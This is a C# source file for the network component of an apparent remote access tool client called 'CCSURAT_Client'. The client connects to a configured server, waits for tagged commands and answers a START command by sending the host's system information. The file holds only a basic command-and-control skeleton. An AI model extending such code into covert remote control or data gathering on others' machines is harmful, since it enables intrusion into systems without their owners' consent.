using System;
using System.Net.Sockets;
using System.Threading;

namespace CCSURAT_Client
{
    class NetworkManager
    {
        private string serverIP;
        private int serverPort;

        // Store main form to print to its console.
        private ClientMainForm mainForm;

        private TcpClient client;
        private NetworkStream netStream;

        private string status;
        private Boolean isConnected;

        public NetworkManager(ClientMainForm form, string IP, int port)
        {
            this.mainForm = form;
            this.serverIP = IP;
            this.serverPort = port;
            SetStatus("Disconnected.");
        }

        // NEED TO MAKE THIS METHOD RE-RUN AFTER CONNECTION LOSS
        public void Start()
        {
            // Attempt TCP listener connection to server.
            SetStatus("Attempting connection.");
            Log("Connecting to server: " + serverIP + ":" + serverPort);
            while (!isConnected)
            {
                try
                {
                    client = new TcpClient();
                    client.Connect(serverIP, serverPort);
                    netStream = client.GetStream();

                    isConnected = true;
                    status = "Connected.";
                    Log("Connection successful!");

                    Thread cmdListenThread = new Thread(ListenToCommands);
                    cmdListenThread.Start();

                    Log("Listening to commands.");
                }
                catch (Exception ex)
                {
                    Log("Error occurred while connecting: " + ex.ToString());
                    Log("Retrying connection...");
                }
            }
        }

        private void ListenToCommands()
        {
            netStream = client.GetStream();
            try
            {
                while (netStream.CanRead)
                {
                    byte[] bytes = new byte[1024];
                    string data = null;
                    int i;
                    if ((i = netStream.Read(bytes, 0, bytes.Length)) != 0)
                    {
                        // convert data bytes to string
                        data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
                        Log("Command recieved: " + data);
                        HandleData(data);
                    }
                    System.Threading.Thread.Sleep(1);
                }
            }
            catch (Exception ex)
            {
                Log("Error recieving command: " + ex.ToString());
            }
        }

        private void HandleData(string data)
        {
            try {
                string command = GetCommand(data);
                data = RemoveCommand(data);
                switch (command)
                {
                    case "START":
                        Write("[[START]]" + SystemUtils.SystemInfo() + "[[/START]]");
                        break;

                }
            } catch(Exception ex)
            {
                Log("Could not handle data: " + data);
            }
        }

        // Gets command tag
        private string GetCommand(string text)
        {
            text = text.Substring(2, text.IndexOf("]") - 2);
            return text;
        }

        // Removes command tag from data
        private string RemoveCommand(string data)
        {
            data = data.Substring(data.IndexOf("]]") + 2);
            data = data.Substring(0, data.LastIndexOf("[") - 1);
            return data;
        }

        // write data to server
        public void Write(string data)
        {
            try {
                byte[] msg = System.Text.Encoding.ASCII.GetBytes(data);
                netStream.Write(msg, 0, msg.Length);
                System.Threading.Thread.Sleep(20);
                Log("Sent data: " + data);
            }
            catch(Exception ex)
            {
                Log("Error sending data: " + ex.ToString());
            }
        }

        private void SetStatus(string s)
        {
            status = s;
        }
        private void Log(string s)
        {
            mainForm.Log(s);
        }
    }
} 
